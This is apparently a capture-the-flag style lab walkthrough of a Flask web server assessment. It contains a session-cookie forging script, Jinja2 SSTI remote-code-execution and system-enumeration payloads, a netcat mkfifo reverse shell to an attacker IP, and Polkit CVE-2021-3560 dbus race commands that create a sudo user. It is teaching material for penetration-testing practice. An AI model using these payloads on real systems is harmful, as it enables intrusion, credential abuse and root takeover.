Now that we have a copy of the source code for the site, we have effectively turned the webapp segment of this assessment into a white-box test. Were this a web-app pentest then we would comb through the source code looking for vulnerabilities; however, in the interests of keeping this short, we shall limit our review purely to the authentication system for the site as this is what we will need to fool with our forged cookie.

---

Let's start by looking at ```modules/admin.py```. This contains the code defining the admin section -- if we look at this then we will see what authentication measures are in place:

![image](https://user-images.githubusercontent.com/5285547/132735632-8aaefd19-e2cb-433a-a77e-ccd098b1bec9.png)

Right at the top of the file we find what we're looking for. Specifically,  there is one line of code which handles the authentication for the ```/admin``` route:

```
@authCheck
Imported in:
from libs.auth import authCheck, checkAuth
```

This is what is referred to as a decorator -- a function which wraps around another function to apply pre-processing. This is not a programming room, and decorators are relatively complicated, so we will not cover them directly within the room. That said, there is an explanation with examples given here, which might be a good idea to take a look at if you aren't already familiar with decorators.

If we have a look at ```libs/auth.py``` we can see the code for this:

![image](https://user-images.githubusercontent.com/5285547/132735788-6d91797d-0525-4573-aff4-ca72530c7054.png)


Short and sweet, this is the full extent of the authentication handler.

Breaking this down a little further, the authentication is handled by a single if/else statement. If checkAuth() (the lambda function1 above) evaluates to true then the decorated function is called, resulting in the requested page loading. If the expression evaluates to false then a message is flashed2 to the user's session and they are redirected back to the login page. About as simple as it gets.

Looking into the checkAuth lambda function:
```checkAuth = lambda: session.get("auth") == "True"```

We can see that all it does is check to see if the user has a value called "auth" in their session, which needs to be set to "True".

This can easily be forged, so in theory we can already get access to the admin area.

Let's have a look at the login endpoint back in ```modules/admin.py```:

![image](https://user-images.githubusercontent.com/5285547/132735871-328af233-26e8-479a-9b06-011fb8c7740a.png)

Breaking this down, we see that it's expecting a post request. It then stores the information being sent in a variable called **body**, then checks to ensure that the parameters **username** and **password** have been sent -- if they haven't been then it flashes an Incorrect Parameters message and redirects them back to the login page.

If these parameters are present then it initialises a connection to the users database and checks the username and password (we won't look at the code here for the sake of brevity, but feel free to read it in **libs/db/auth.py**). If the authentication is successful then it sets two session values:

It sets **auth** to "True". We already knew about this one.
It sets **username** to the username that we posted it. This will be important later.
It then redirects the user to the management homepage (**/admin**).

We now have everything we need, so let's forge some cookies!
---

1. Lambda functions are anonymous functions meaning that they don't have to be given a name or assigned anywhere. In this case the lambda function is being assigned to a variable (**checkAuth**) and the lambda syntax is being used for little more than cleanliness.

2. "Flashing" is Flask's way of persisting messages between requests. For example, if you try to log into an application and fail then the request endpoint may redirect you back to the login page with an error message. This error message would be "flashed" -- meaning it's stored in your session temporarily where it can be read by code in the login page and displayed to you.

## Task 15

### Web App Cookie Forgery

There are many ways to forge a Flask cookie -- most involve diving down into the internals of the Flask module to use the session handler directly: a very complicated solution to what is actually an incredibly simple problem.

We need to generate Flask cookie. What better way to do that than with a Flask app?

In short, we are going to write our own (very simple) Flask app which will take the secret key we "borrowed" and use it to generate a signed session cookie with, well, basically whatever we want in it.

Before we start writing, let's create a Python Virtual Environment for our project. A virtual environment (or venv) allows us to install dependencies for a project without running the risk of breaking anything else.

Make sure that we have the requisite dependencies installed:
```sudo apt update && sudo apt install python3-venv```

Now we can create the virtual environment:
```python3 -m venv poc-venv```

This will create a subdirectory called ```poc-venv``` containing our virtual environment.
We can activate this using the command: ```source poc-venv/bin/activate```.

This should change your prompt to indicate that we are now in the virtual environment:

![image](https://user-images.githubusercontent.com/5285547/132736832-cabddc58-5475-46b8-977c-b685a6b70d17.png)

When we are done using our program, we can use ```deactivate``` to leave the virtual environment.

---

Let's start our PoC by installing dependencies:
```pip3 install flask requests waitress```

Waitress isn't actually required here, but using it is very simple and makes the output of this code much cleaner, so we might as well add it in.

Next we need to open a blank text document and start a new Python script:

```python3
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time
```

This gives us a Python script with a variety of modules. We have everything we need to set up a Flask app via the flask and waitress modules; then we also have requests, threading, and time, which we will use to automatically query the server we are setting up.

With the imports sorted, let's initialise the app:

```
app = Flask(__name__)
app.config["SECRET_KEY"] = "PUT_THE_KEY_HERE"
```

This creates a new Flask app object and configures the secret key. You will obviously have to substitute in the key you found earlier in the disclosed main.py file, replacing the "PUT_THE_KEY_HERE" text.

Next let's configure a webroot which will set the two session values we identified earlier:

```
@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "Pentester"
    return "Check your cookies", 200
```

Our app is now ready to go, we just need to start it and query it.

We could technically just start the app here and navigate to it in our browser, but that would be boring. Let's do this all from the command line.

If we are doing two things at once (starting the app, then sending a request to it), we will need to use threading, thus our next lines of code are:

```
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()
```

This creates a thread and gives it the job of starting waitress using our app object on ```localhost:9000```. It then tells the thread to daemonise, meaning it won't prevent the program from exiting (i.e. if the program exits then the server will also stop, but the program won't wait for the server to stop before exiting). Finally we start the thread, making the server run in the background.

The last thing we need this program to do is query the server:

```
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

This will wait for one second to give waitress enough time to start the server, then it will query the endpoint that we setup, making Flask generate and provide us with a cookie which the program will then print out. The program then ends, stopping the server automatically.

We are now ready to go!

The final program should look like this, albeit with your own key substituted in:

```python3 
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

#Flask Initialisation
app = Flask(__name__)
app.config["SECRET_KEY"] = "e64402685ec842717a86898aa4e3c962"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "Pentester"
    return "Check your cookies", 200

#Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

#Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

Running the program should give us a cookie signed by the server using our stolen key:

![image](https://user-images.githubusercontent.com/5285547/132737238-a39b7cb5-d52c-4324-a121-c24e7fb750d6.png)

This will be different every time the program is run.

Now let's finish this. Copy the generated cookie, open your browser dev tools on the website, and overwrite the value of your current session cookie. This can also be done using a browser extension such as Cookie-Editor.

We should now be able to access ```https://hipper.hipflasks.thm/admin```

![image](https://user-images.githubusercontent.com/5285547/132737354-910c01d9-5b27-42dc-b85b-9c5b4196ef6a.png)

Mine: 

```
eyJhdXRoIjoiVHJ1ZSIsInVzZXJuYW1lIjoiUGVudGVzdGVyIn0.YTpKWA.0gIb-ACPZWDG-2q1F7cwFbEpZrU
```

## Task 16

### Web App Server-Side Template Injection (SSTI)

We have gained access to the admin console, but we don't appear to have gained anything by doing so. All we have here is a stats counter (which we already had from downloading the DB anyway).

So, why did we bother going through all that rigamarole if the admin console doesn't actually give us any extra power over the webapp?

If you've hacked Flask apps before, you may already know the answer to this having read through the source code for the application. There is a serious vulnerability in the admin.py module -- one that (in this case) can only be accessed after we login.

When you logged into the admin page, did you notice that it echoed the forged username back to you?

![image](https://user-images.githubusercontent.com/5285547/132740774-523f5de8-3a39-453b-901d-7d216bb26447.png)

This indicates that there is some form of template editing going on in the background -- in other words, the webapp is taking a prewritten template and injecting values into it. There are secure ways to do this, and there are... less secure ways of doing it.

Specifically, the code involved (from modules/admin.py) is this:

![image](https://user-images.githubusercontent.com/5285547/132740801-2f80fd59-5d7a-4f87-b3c8-2b120e80b262.png)

Aside from using an inline string for the template (which is both messy and revoltingly bad practice), this also injects the contents of session["username"] directly into the template prior to rendering it. It does the same thing with uniqueViews (the number of unique visitors to the site); however, we can't modify this. What we can do is change our username to something that the Flask templating engine (Jinja2) will evaluate as code. This vulnerability is referred to as an SSTI -- Server Side Template Injection; it can easily result in remote code execution on the target.

---

There is already an entire room covering SSTI in Flask applications, so we will not go into a whole lot of detail about the background of the vulnerability here. The short version is this:

Flask uses the Jinja2 templating engine. A templating engine is used to "render" static templates -- in other words, it works with the webapp to substitute in variables and execute pieces of code directly with the template. For example, take a look at the following HTML:

![image](https://user-images.githubusercontent.com/5285547/132740877-59405e61-1882-47c6-b425-56f91c9997fc.png)

Notice anything unusual? This HTML code has a {{title}} in it. This {{ }} structure (and a few other similar structures) is what tells Jinja2 that it needs to do something with this template -- specifically, in this case it would be filling in a variable called title. This could then be called at the end of a Flask route by Python code looking something like this:
return render_template("test.html", title="Templates!"), 200

The Templates! would then be substituted in as the title of the page when it loads in a client's browser.

This is all well and good, but what happens if we control the template? What if we could add things directly into the template before it gets rendered? We could inject code blocks inside curly brackets and Jinja2 would execute them when it rendered the template.

Here is an example:

![image](https://user-images.githubusercontent.com/5285547/132740920-34fe3225-a81c-4aae-b797-1a354d39b0d9.png)

Instead of using render_template, this code uses the render_template_string function to render a template stored as an inline Python string. Instead of passing in the title variable to Jinja2 for rendering, a Python f-string is used to format the template before it is rendered. In other words, the developer has substituted in the contents of title before the string is actually passed to the templating engine.

This is fine for the example above (if poor practice), but what happens if title was, say: {{7*6}}?

![image](https://user-images.githubusercontent.com/5285547/132740968-979549c7-6deb-4ca7-9617-320397cb2f4c.png)

Meaning Jinja2 would evaluate 7*6 and display this to the client:

![image](https://user-images.githubusercontent.com/5285547/132741006-e1efc8ba-94e2-41b9-abda-19c92c05cb4c.png)


Getting the templating engine to do simple calculations for us is not desperately useful, but it's a really good way of demonstrating that an SSTI vulnerability exists.

This can only occur if the developer is handling the templates exceptionally stupidly (which, for this webapp, they are). Regardless, this is is still one of the most stereotypical vulnerabilities to find in a Flask application -- for a reason. A better option would be to pass the variables needing rendered into Jinja2, rather than editing the template directly.
---

Okay, let's go confirm the presence of an SSTI vulnerability.

We can use the same Proof of Concept script that we wrote to forge our admin cookie, but this time we set the username to "{{7*6}}":

![image](https://user-images.githubusercontent.com/5285547/132741073-0dc3e09f-abf0-43f6-9daf-6fb3f2c68b8d.png)

Remember to change the secret key if you're copy/pasting!

We need to run this, then overwrite our session cookie with the generated cookie again.

![image](https://user-images.githubusercontent.com/5285547/132741102-ee66d2db-f425-4594-a243-cd386cc9fab6.png)


## Task 17

### Web App SSTI -> RCE

Okay, we've demonstrated SSTI. How do we weaponize it?

As always, PayloadsAllTheThings is our friend -- specifically the Jinja section of the SSTI page.

There are various RCE payloads available here. Through trial and error, we find one which works:
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

If we put this into our PoC code in the username field then execute the script and overwrite our cookie once again, we can confirm that this works:

![image](https://user-images.githubusercontent.com/5285547/132741617-cb37af38-31ff-4478-a917-5dc3cd7931ac.png)

Almost time to weaponize this, but first we need to do a little enumeration. Specifically, we need to know if there is a firewall in place, what software is installed, and preferably if there are any protective measures in place. This is Linux so the chances of having to deal with anti-virus is minimal, but we may need to circumvent hardening measures (e.g. AppArmour, SeLinux, etc).

Running multiple commands in this situation is a pain as we would need to generate a new cookie for each command. Instead we will just use one big one-liner to enumerate as many things at once as possible:
```
session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('echo ""; id; whoami; echo ""; which nc bash curl wget; echo ""; sestatus 2>&1; aa-status 2>&1; echo ""; cat /etc/*-release; echo""; cat /etc/iptables/*').read()}}"""
```

This gets us user information, useful software, lockdown status, release information and firewall information: enough to be getting on with.

The output of this is extremely difficult to read in the tiny little information box of the admin page, so it's worth looking at the source code for an easy-to-read output instead:

- Enumeration Output
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data

/usr/bin/nc
/usr/bin/bash
/usr/bin/curl
/usr/bin/wget

/bin/sh: 1: sestatus: not found
You do not have enough privilege to read the profile set.
apparmor module is loaded.

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION=&#34;Ubuntu 20.04.2 LTS&#34;
NAME=&#34;Ubuntu&#34;
VERSION=&#34;20.04.2 LTS (Focal Fossa)&#34;
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME=&#34;Ubuntu 20.04.2 LTS&#34;
VERSION_ID=&#34;20.04&#34;
HOME_URL=&#34;https://www.ubuntu.com/&#34;
SUPPORT_URL=&#34;https://help.ubuntu.com/&#34;
BUG_REPORT_URL=&#34;https://bugs.launchpad.net/ubuntu/&#34;
PRIVACY_POLICY_URL=&#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&#34;
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

# Generated by iptables-save v1.8.4 on Tue Jun 22 22:27:55 2021
*filter
:INPUT ACCEPT [174:25634]
:FORWARD ACCEPT [0:0]
:OUTPUT DROP [0:0]
-A INPUT -p icmp -j DROP
-A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -p tcp -m multiport --dports 443,445,80,25,53 -j ACCEPT
-A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
-A OUTPUT -p icmp -j ACCEPT
COMMIT
# Completed on Tue Jun 22 22:27:55 2021
# Generated by ip6tables-save v1.8.4 on Tue Jun 22 22:27:55 2021
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
COMMIT
# Completed on Tue Jun 22 22:27:55 2021
```

This tells us a bunch of useful things:

- As expected we are in the low-privileged www-data account
- We have enough useful software to easily make web requests and create a reverse shell
- SeLinux is not installed. AppArmour is, and we don't have permission to view the status, so we'll have to go in blind and hope
- This is an Ubuntu 20.04 machine -- as expected
- There is a firewall in place (as expected). It blocks all outgoing traffic to anything other than TCP ports 443, 445, 80, 25, or 53, and UDP port 53. Outbound ICMP packets are allowed. There are no IPv6 rules.

We've done all we can for now. Let's get a shell and be done with this. A standard netcat mkfifo shell ought to do the trick:

```session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.8.153.120 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}"""
```

![image](https://user-images.githubusercontent.com/5285547/132741832-8edc7fd0-9224-4c71-91d1-191453bb8f5a.png)


## Task 18

### Enumeration Shell Stabilisation and Local Enumeration

Before we do anything else, let's quickly stabilise our reverse shell. As www-data we won't be able to use SSH, so that's out. We could upload socat and use that, but we don't know what AppArmour is doing just now (although checking that with our new access should be high on our list of priorities!). Let's instead just use the classic "Python" shell stabilisation technique. This is explained in detail in the Intro to Shells room, which you are recommended to have a look through if you haven't already.

First let's check that we can use Python:
```which python python3```

The affirmative response indicates that this technique is good to go, so we will start by creating a PTY running bash:
```python3 -c 'import pty;pty.spawn("/bin/bash")'```

Next we set the TERM environment variable. This gives us access to commands such as clear.
```export TERM=xterm```

Finally we remove the terminal echo of our own shell (so that we can use Ctrl + C / Ctrl + Z without killing our shell), and set the tty size of our remote shell to match that of our terminal so that we can use full-screen programs such as text-editors.

- Press Ctrl + Z (or equivalent for your keyboard) to background the remote shell.
- Run stty -a in your own terminal and note down the values for rows and columns.
- Run stty raw -echo; fg in your own terminal to disable terminal echo and bring the remote shell back to the foreground.
- Use stty rows NUMBER cols NUMBER in the remote shell to set the tty size
Note: these numbers depend on your screen and terminal size and will likely be different for everyone

![image](https://user-images.githubusercontent.com/5285547/132742690-bfa8692d-01e2-4739-a766-b9dfcd4fc105.png)

Bingo. We are now in a fully stabilised shell.
---

Let's quickly check the ```/etc/apparmor.d``` directory to see if there are any configurations that would restrict us from enumerating:

![image](https://user-images.githubusercontent.com/5285547/132742762-47dcaf2d-ddf8-4a9e-bbcc-8ef88cb68d9f.png)

It doesn't look like there are any custom policies or signs of anything being locked down more than the default configuration, so we should be good to go on the enumeration front. That said, the fact that FireFox, LibreOffice and cupsd are installed is very interesting -- these indicate that the machine has a desktop environment installed (presumably it has a monitor plugged in for easy configuration wherever it is in the client's office). Worth keeping in mind as we progress.

---

Now would be a good time to start running some enumeration scripts (e.g. LinPEAS, LinEnum, LES, LSE, Unix-Privesc-Check, etc). It's good practice to run several of these, as they all check for slightly different things and what one finds another may not.

That said, before we start uploading scripts, we would be as well performing a few manual privilege escalation checks. This is especially useful if there are serious new vulnerabilities out for the distribution that we're attacking as these may not yet be patched on the target. At the time of writing there is a brand new privilege escalation vulnerability in the Polkit authentication module which affects Ubuntu 20.04 (CVE-2021-3560), so checking for this is an absolute must. Running any of the scripts (or checking manually), we also find that there are no user accounts on the machine, and that SSH is enabled for the root user with a private key. This indicates that the root account is used for day-to-day administrative tasks.

There's no strict order for manual checking, so let's just jump straight to it and look for unpatched software:

![image](https://user-images.githubusercontent.com/5285547/132742843-19cc68c6-77fe-4927-b87f-dc4a0a89fd2e.png)


Quite the list! This machine is clearly in need of some upgrades, which could be very good for us and very bad for the client.

Unfortunately for the client, the polkit libraries are not updated (version 0.105-26ubuntu1 rather than 0.105-26ubuntu1.1), which means we should be able to escalate privileges straight to root using CVE-2021-3560.

![image](https://user-images.githubusercontent.com/5285547/132742916-89b6fdcf-1133-4386-ad9f-34b7bb9656db.png)

## Task 19

### Privilege Escalation Polkit 

CVE-2021-3560 is, fortunately, a very easy vulnerability to exploit if the conditions are right. The vuln is effectively a race condition in the policy toolkit authentication system.

There is already a TryHackMe room which covers this vulnerability in much more depth here, so please complete that before continuing if you haven't already done so as we will not cover the "behind the scenes" of the vuln in nearly as much depth https://tryhackme.com/room/polkit.

Effectively, we need to send a custom dbus message to the accounts-daemon, and kill it approximately halfway through execution (after it gets received by polkit, but before polkit has a chance to verify that it's legitimate -- or, not, in this case).

We will be trying to create a new account called "attacker" with sudo privileges. Before we do so, let's check to see if an account with this name already exists:

```
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
```

![image](https://user-images.githubusercontent.com/5285547/132743135-e7b8fe1c-367c-45a2-b5d5-1921a7fd8840.png)

We now need to take the same dbus message, send it, then cut it off at about halfway through execution. 5 milliseconds tends to work fairly well for this box:

```
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
```
We can then check to see if a new account has been created (id attacker):

![image](https://user-images.githubusercontent.com/5285547/132743328-90a9d8ff-d10a-4f28-8649-4c3bec1667b0.png)

Note: you may need to repeat this a few times with different delays before the account is created.

Notice that this account is in the sudoers group. For a full breakdown of this command, refer to the Polkit room.

Next we need to set a password for this account. We use exactly the same technique here, but with a different dbus message. Whatever delay worked last time should also work here:

```
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
```

This will set the password of our new account to ```Expl01ted``` -- all ready for us to just su then ```sudo -s``` our way to root!

And with that, we are done. Although, we aren't really, because we should keep looking around for more vulnerabilities. The goal in an assessment isn't necessarily to "root the box" -- the goal is to identify vulnerabilities in the target and raise them with the client. Being able to obtain administrative privileges over the target counts as a vulnerability, and helps us to identify further vulnerabilities, but isn't the be-all-end-all.

![image](https://user-images.githubusercontent.com/5285547/132745033-824a0c8b-e6d5-4dae-b5b3-69405f2b50ce.png)

## Task 20

### Conclusion

![image](https://user-images.githubusercontent.com/5285547/132745141-cc93a905-f379-47ee-8a05-fe8d99bbf77f.png)

![image](https://user-images.githubusercontent.com/5285547/132745183-496833c3-2bb9-48c2-9e91-77c890725a9a.png)

![image](https://user-images.githubusercontent.com/5285547/132745245-dc4ce2b4-476f-447c-b26f-9bf297a441c3.png)

![image](https://user-images.githubusercontent.com/5285547/132745280-be43b116-7879-4942-aef4-04b971ba83c2.png)

If this were a real client, we would now write a report containing this information. Report writing is outwith the scope of this room; however, if you wish to write a report and submit it as a writeup following the same rules as with Wreath, you may find Task 44 of the Wreath network useful.

It is also worth noting that many informational entries were missed out here for brevity (which would be included in a real report), and no post-exploitation steps were taken (e.g. attempting to crack the root password hash to check password complexity). These are things you may wish to add for yourself. Equally, you may wish to figure out how to allow Nessus to run using SSH credentials (something which would usually be done with the client's direct co-operation).

We have now finished our assessment of the Hip Flask webserver.

This was a brief introduction into the mindset and bureaucratic procedures involved in an attack such as this. It should be noted that -- whilst these are all real-world vulnerabilities -- the chances of seeing a kill-chain from network access to root (as we showcased here) are significantly slimmer in a real engagement.  Regardless, this should hopefully have provided a bit of an introduction into the topic.
